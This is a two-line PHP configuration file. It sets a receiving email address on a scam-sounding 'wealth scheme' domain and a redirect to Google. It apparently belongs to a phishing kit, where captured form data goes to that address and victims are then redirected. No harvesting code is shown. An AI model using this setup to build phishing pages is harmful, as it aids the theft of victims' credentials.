<?php 
$Receive_email="support@advisablewealthschemellc.biz";
$redirect="https://www.google.com/";
?>